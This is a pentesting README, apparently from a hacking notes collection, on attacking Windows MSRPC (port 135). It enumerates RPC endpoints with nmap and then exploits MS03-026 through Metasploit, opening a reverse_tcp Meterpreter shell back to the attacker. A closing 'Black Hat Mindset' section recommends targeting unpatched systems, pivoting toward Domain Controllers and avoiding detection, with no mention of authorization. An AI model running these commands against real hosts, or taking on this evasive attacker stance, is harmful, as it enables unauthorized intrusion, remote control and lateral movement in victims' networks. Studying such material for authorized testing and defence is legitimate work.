# Basic Methodology - Port 135 (MSRPC)

This README explores exploiting the Microsoft Remote Procedure Call (MSRPC) service on port 135, focusing on enumerating RPC endpoints with Nmap and exploiting a stack buffer overflow vulnerability (MS03-026) in the RPCSS service using Metasploit.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating MSRPC Endpoints](#enumerating-msrpc-endpoints)
- [Exploiting MS03-026 with Metasploit](#exploiting-ms03-026-with-metasploit)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

MSRPC on port 135 is a critical service in Windows systems, used for remote procedure calls between clients and servers, often exposing vulnerabilities if unpatched. The MS03-026 vulnerability (CVE-2003-0352) is a stack buffer overflow in the RPCSS service, famously exploited by worms like Blaster. This guide covers enumerating RPC endpoints with Nmap and exploiting MS03-026 using Metasploit.

## Setup and Prerequisites

- **Environment**: Linux host with network access to the target Windows system.
- **Tools**: Install nmap (e.g., `apt install nmap`) and Metasploit Framework (e.g., `apt install metasploit-framework`).
- **IP Address**: Identify the target IP address (e.g., `<IP address>`).
- **Permissions**: No authentication is required for enumeration; exploitation depends on the target's patch level.

## Enumerating MSRPC Endpoints

Identify available RPC services and interfaces.

```bash
$ nmap <IP address> --script=msrpc-enum
```

Uses Nmap's msrpc-enum script to enumerate RPC endpoints on the target at `<IP address>`, revealing UUIDs, interfaces, and bindings (Linux).

Example Output:
```
PORT    STATE SERVICE
135/tcp open  msrpc
| msrpc-enum:
|   [135/TCP]
|     Interface UUID: 12345778-1234-abcd-ef00-0123456789ab
|     Interface Name: ISystemActivator
|     Binding: ncacn_ip_tcp:<IP address>[135]
```

### Usage Tip:

Combine with `--script-args=msrpc-enum.showuuids` to display more detailed UUID information.

## Exploiting MS03-026 with Metasploit

Exploit the stack buffer overflow in the RPCSS service (MS03-026).

```bash
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

Selects the Metasploit module for the MS03-026 exploit, targeting the DCOM interface via RPC (Linux).

### Steps:

```bash
msf > set RHOST <IP address>
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > set LHOST <your IP>
msf > set LPORT 4444
msf > exploit
```

### Outcome:

If successful, you'll get a Meterpreter session on unpatched systems (e.g., Windows XP, Server 2003).

## Black Hat Mindset

- **Map RPC Services**: Use msrpc-enum to identify interfaces for targeted exploitation.
- **Exploit Unpatched Systems**: Target legacy systems (e.g., Windows XP) with MS03-026 for quick wins.
- **Escalate Privileges**: Leverage gained shells to pivot within the network, especially on Domain Controllers.
- **Stay Silent**: Minimize exploitation attempts to avoid detection by modern defenses.

## Resources

- MSRPC Overview
- MS03-026 Details
- Nmap NSE Documentation
- Metasploit Guide

